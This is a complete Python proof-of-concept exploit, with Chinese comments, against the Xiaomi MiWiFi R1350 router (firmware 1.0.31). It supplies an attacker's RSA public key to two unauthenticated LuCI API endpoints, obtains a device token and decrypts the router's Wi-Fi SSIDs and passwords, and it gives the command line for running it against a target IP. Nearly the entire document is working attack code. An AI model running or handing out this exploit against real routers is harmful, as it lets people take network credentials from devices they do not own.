#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Xiaomi MiWiFi R1350 (1.0.31) unauthenticated Wi-Fi password disclosure PoC
==========================================================================
漏洞: GET /cgi-bin/luci/api/misystem/get_wifi_pwd_url (flag 0x09)
     GET /cgi-bin/luci/api/misystem/get_wifi_pwd   (flag 0x09)
原理: getWifiPwdUrl 把攻击者提供的 RSA 公钥缓存并返回 RSA(url) (url 内含
     token=设备UUID); get_wifi_pwd 用该公钥加密 2G/5G SSID+密码返回。
     攻击者用自己的私钥解密 => 未授权获得 WiFi 明文密码。
格式怪癖: 固件 read_txt 只读一行, librsa(mbedtls) 接受单行裸 base64
     (SPKI DER) 公钥 — 公钥必须传单行 base64, 不能传多行 PEM。

依赖: cryptography (pip install cryptography)

用法: python exp_wifi_pwd_leak.py <router_ip>
"""
import base64
import json
import sys
import urllib.parse
import urllib.request

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization


def gen_keypair():
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    priv = key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    )
    pub_der = key.public_key().public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    # 单行裸 base64 (SPKI DER b64) — read_txt 一行 + mbedtls keybuf
    pub_b64 = base64.b64encode(pub_der).decode()
    return priv, pub_b64


def rsa_decrypt(priv_pem, data):
    key = serialization.load_pem_private_key(priv_pem, password=None)
    return key.decrypt(data, padding.PKCS1v15())


def http_get(url, timeout=120):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode(errors="replace")


def main():
    router = sys.argv[1] if len(sys.argv) > 1 else "192.168.31.1"
    priv, pub_b64 = gen_keypair()
    print("[*] 已生成一次性 RSA-2048 密钥对(公钥单行 base64, %d 字节)" % len(pub_b64))

    # Step 1: 交付公钥, 拿加密的 url(含 token)
    url1 = "http://%s/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=%s" % (
        router, urllib.parse.quote(pub_b64, safe=""))
    print("[*] Step1 GET get_wifi_pwd_url")
    r1 = http_get(url1)
    print("    resp: %s" % r1.strip()[:100])
    j1 = json.loads(r1)
    if j1.get("code") != 0 or "url" not in j1:
        sys.exit("[-] get_wifi_pwd_url 失败: %s" % j1)

    url_plain = rsa_decrypt(priv, base64.b64decode(j1["url"]))
    print("[+] Step1 解密 url: %s" % url_plain.decode(errors="replace"))

    url_text = url_plain.decode(errors="replace")
    token = urllib.parse.parse_qs(urllib.parse.urlparse(url_text).query)["token"][0]
    print("[+] token = %s (设备 UUID, 300s 内有效)" % token)

    # Step 2: 用 token 取回 RSA 加密的 WiFi 凭证
    url2 = "http://%s/cgi-bin/luci/api/misystem/get_wifi_pwd?token=%s" % (router, token)
    print("[*] Step2 GET get_wifi_pwd")
    r2 = http_get(url2)
    print("    resp: %s" % r2.strip()[:100])
    j2 = json.loads(r2)
    if j2.get("code") != 0 or "info" not in j2:
        sys.exit("[-] get_wifi_pwd 失败: %s" % j2)

    cred = rsa_decrypt(priv, base64.b64decode(j2["info"]))
    info = json.loads(cred.decode(errors="replace"))
    print("[+] ================= WiFi 凭证 (未授权获取) =================")
    for k, v in info.items():
        print("    %-8s = %s" % (k, v))
    print("[+] =========================================================")


if __name__ == "__main__":
    main()
